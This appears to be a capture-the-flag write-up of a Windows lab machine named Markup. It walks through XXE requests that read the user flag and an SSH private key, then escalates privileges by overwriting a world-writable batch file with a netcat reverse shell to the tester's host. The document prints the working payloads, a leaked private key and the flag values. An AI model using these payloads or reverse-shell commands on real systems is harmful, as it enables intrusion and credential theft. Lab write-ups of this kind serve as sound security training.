# Intro


Tags: #windows #WebApp #SpecialPermissionsFiles #XEE #OSCPpath #veryeasy
Tools used:

----
# Reconnaissance

## Add target to /etc/hosts

```bash
sudo sh -c "echo '10.129.1.7 markup.htb' >> /etc/hosts"
```

## Port Scanning

### Nmap scan
```bash
sudo nmap -sC -sV markup.htb
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 19:24 UTC
Nmap scan report for markup.htb (10.129.1.7)
Host is up (0.048s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds
```

## Banner Grabbing

### whatweb
```bash
whatweb markup.htb
```

```bash
http://markup.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.1.7], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28]
https://markup.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.1.7], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28]
```

### HTTP header
```bash
curl -I http://markup.htb
```
```bash
HTTP/1.1 200 OK
Date: Fri, 20 Feb 2026 19:24:50 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Set-Cookie: PHPSESSID=vv4cg70a2a5gua1dahnka27pa4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

## Web Enumeration

### Directories

```shell
PAGE_SIZE=$(curl -s http://markup.htb | wc -c) && gobuster dir --url http://markup.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length $PAGE_SIZE -t 50
```

```shell
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://markup.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          12100
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 1043]
/.hta                 (Status: 403) [Size: 1043]
/.htpasswd            (Status: 403) [Size: 1043]
/Images               (Status: 301) [Size: 334] [--> http://markup.htb/Images/]
/aux                  (Status: 403) [Size: 1043]
/cgi-bin/             (Status: 403) [Size: 1057]
/com2                 (Status: 403) [Size: 1043]
/com4                 (Status: 403) [Size: 1043]
/com1                 (Status: 403) [Size: 1043]
/com3                 (Status: 403) [Size: 1043]
/con                  (Status: 403) [Size: 1043]
/images               (Status: 301) [Size: 334] [--> http://markup.htb/images/]
/examples             (Status: 503) [Size: 1057]
/licenses             (Status: 403) [Size: 1202]
/lpt1                 (Status: 403) [Size: 1043]
/lpt2                 (Status: 403) [Size: 1043]
/nul                  (Status: 403) [Size: 1043]
/phpmyadmin           (Status: 403) [Size: 1202]
/prn                  (Status: 403) [Size: 1043]
/render?url=https://www.google.com (Status: 403) [Size: 1043]
/server-info          (Status: 403) [Size: 1202]
/server-status        (Status: 403) [Size: 1202]
/webalizer            (Status: 403) [Size: 1043]
/dns-query?name=google.com&type=A (Status: 403) [Size: 1043]
/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB (Status: 403) [Size: 1043]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

### Subomains

```shell
gobuster dns --domain markup.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```
found nothing

### Vhosts

```shell
PAGE_SIZE=$(curl -s http://markup.htb | wc -c) && gobuster vhost --url http://markup.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length $PAGE_SIZE -t 50
```

```shell
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://markup.htb
[+] Method:                    GET
[+] Threads:                   50
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Length:            12100
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```
found nothing

-----
# Foothold

### Default/easy credentials

logged in with very easy creds
```
admin
password
```

![](MediaFiles/Pasted%20image%2020260220213232.png)

`What is the word at the top of the page that accepts user input?` -> order
![](MediaFiles/Pasted%20image%2020260220213439.png)view page source

### XML version

```xml
 <script>
        function getXml() {
            var elements = document.forms.myForm.elements;
            var xmlTemplate = '<?xml version = "1.0"?><order>';
            for (var i = 0; i < elements.length; i++) {
                var element = elements[i];
```
`What XML version is used on the target?` -> 1.0
By searching online, i found that this version is vulnerable to `XXE` attack

### XXE (external entity injection)

`What does the XXE / XEE attack acronym stand for?` -> XML External Entity

`What username can we find on the webpage's HTML code?` -> Daniel

`What is the file located in the Log-Management folder on the target?`

#### Using Burp

we need to use burp for this, since we got a hint earlier for `XXE`

On Order page, we capture request

```powershell
POST /process.php HTTP/1.1

Host: markup.htb

Content-Length: 109

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

Content-Type: text/xml

Accept: */*

Origin: http://markup.htb

Referer: http://markup.htb/services.php

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=23hm58q01j5s41komatpb5g7l3

Connection: keep-alive



<?xml version = "1.0"?><order><quantity></quantity><item>Home Appliances</item><address>sth</address></order>
```
then since we know the presence of `XXE`, we can leak files

#### Leaking private key of user

we can also read the flag directly
```powershell
POST /process.php HTTP/1.1

Host: markup.htb

Content-Length: 206

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

Content-Type: text/xml

Accept: */*

Origin: http://markup.htb

Referer: http://markup.htb/services.php

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=23hm58q01j5s41komatpb5g7l3

Connection: keep-alive



<?xml version = "1.0"?>

<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "file:///c:/users/daniel/Desktop/user.txt">

]>



<order><quantity></quantity><item>Home Appliances

&xxe;</item><address>sth</address></order>
```
keep in mind that here we "declare" an entity with name `xxe` and then we "call" it via `&xxe`
![](MediaFiles/Pasted%20image%2020260220223326.png)
Okay alright we can read the flag from here, but lets get shell. Since we can retrieve files, we can possibly retrieve ssh keys for user `daniel`

request
```powershell
POST /process.php HTTP/1.1
Host: markup.htb
Content-Length: 201
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://markup.htb
Referer: http://markup.htb/services.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=23hm58q01j5s41komatpb5g7l3
Connection: keep-alive

<?xml version = "1.0"?>

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
]>

<order><quantity></quantity><item>Home Appliances

&xxe;</item><address>sth</address></order>
```

```powershell
HTTP/1.1 200 OK

Date: Fri, 20 Feb 2026 21:34:28 GMT

Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28

X-Powered-By: PHP/7.2.28

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 2652

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8



Your order for Home Appliances
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

```powershell
chmod 600 id_rsa
```

### Shell as user daniel

```powershell
└─$ ssh daniel@markup.htb -i id_rsa 
The authenticity of host 'markup.htb (10.129.1.7)' can't be established.
ED25519 key fingerprint is: SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'markup.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>whoami
markup\daniel

daniel@MARKUP C:\Users\daniel>hostname
MarkUp

daniel@MARKUP C:\Users\daniel>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::f7
   IPv6 Address. . . . . . . . . . . : dead:beef::213
   IPv6 Address. . . . . . . . . . . : dead:beef::3d3b:410e:9a86:7548
   Link-local IPv6 Address . . . . . : fe80::3d3b:410e:9a86:7548%4
   IPv4 Address. . . . . . . . . . . : 10.129.1.7
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:a142%4
                                       10.129.0.1
daniel@MARKUP C:\Users\daniel>dir                          
 Volume in drive C has no label.                 
 Volume Serial Number is BA76-B4E3               
                                                 
 Directory of C:\Users\daniel                    
                                                 
10/13/2021  03:43 PM    <DIR>          .         
10/13/2021  03:43 PM    <DIR>          ..        
03/05/2020  05:19 AM    <DIR>          .ssh      
03/05/2020  06:18 AM    <DIR>          Desktop   
04/21/2020  02:34 AM    <DIR>          Documents 
09/14/2018  11:12 PM    <DIR>          Downloads 
09/14/2018  11:12 PM    <DIR>          Favorites
09/14/2018  11:12 PM    <DIR>          Links
09/14/2018  11:12 PM    <DIR>          Music
09/14/2018  11:12 PM    <DIR>          Pictures
09/14/2018  11:12 PM    <DIR>          Saved Games
09/14/2018  11:12 PM    <DIR>          Videos
               0 File(s)              0 bytes
              12 Dir(s)   7,335,563,264 bytes free
daniel@MARKUP C:\Users\daniel\Desktop>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel\Desktop

03/05/2020  06:18 AM    <DIR>          .
03/05/2020  06:18 AM    <DIR>          ..
03/05/2020  06:18 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)   7,335,563,264 bytes free
daniel@MARKUP C:\Users\daniel\Desktop>type user.txt 
032d2fc8952a8c24e39c8f0ee9918ef7  
```

-----------
# Privesc

we are in, now for this question
`What is the file located in the Log-Management folder on the target?` -> job.bat 

## Filesystem enumeration

### Found .bat file

as seen below, by browsing the filesystem
```powershell
daniel@MARKUP C:\Log-Management>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Log-Management

03/12/2020  02:56 AM    <DIR>          .
03/12/2020  02:56 AM    <DIR>          ..
03/06/2020  01:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,335,559,168 bytes free

```

#### Write permissions found on file

`What executable is mentioned in the file mentioned before?`
```powershell
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
but what does the above mean?
`BUILTIN\Users` has (F) full access to this file, which means that if we modify it we can get an (elevated) reverse shell!

#### Understanding how the bat file works

lets view it
```powershell
daniel@MARKUP C:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```
here is the answer to the question -> wevtutil.exe

Now lets understand what this is doing, it actually executes commands 
if you try running it:
```powershell
daniel@MARKUP C:\Log-Management>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Log-Management> ./job.bat
You must run this script as an Administrator! 
```
But how to move forward? well we are given the hint that u must run this as an Administrator, and we also know that we can modify (write) towards this .bat.

ideally, we wanna write to it a rev shell.  Then by running it, it it will give us an elevated shell as administrator How?

### Exploiting write permissions
#### Via netcat

Download `n64.exe`: https://github.com/int0x33/nc.exe/

transfer netcat on target since it does not exist
```shell
python3 -m http.server 8001
```
then on target
```powershell
wget http://10.10.14.39:8001/nc64.exe -outfile nc.exe
```
on your host u must see this when done
```shell
└─$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.1.7 - - [20/Feb/2026 20:59:49] "GET /nc64.exe HTTP/1.1" 200 -
```
lets verify its now on target:
```powershell
PS C:\Log-Management> dir
    Directory: C:\Log-Management

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----        2/20/2026   1:59 PM          45272 nc.exe
```
from powershell:
```powershell
Set-Content -Path C:\Log-Management\job.bat -Value "C:\Log-Management\nc.exe -e cmd.exe 10.10.14.39 4444"
```
or without powershell:
```
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.14.39 4444 > C:\Log-Management\job.bat
```

### Shell as Administrator

got administrator shell!
```powershell
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.1.7] 65290
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\administrator

C:\Windows\system32>hostname
hostname
MarkUp

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::46
   IPv6 Address. . . . . . . . . . . : dead:beef::3d3b:410e:9a86:7548
   Link-local IPv6 Address . . . . . : fe80::3d3b:410e:9a86:7548%4
   IPv4 Address. . . . . . . . . . . : 10.129.1.7
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:a142%4
                                       10.129.0.1

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
f574a3e7650cebd8c39784299cb570f8
```

------
# Summary




------
# Sidenotes

An introductory windows machine with emphasis on XEE and exploiting write permissions on file run by Administrator 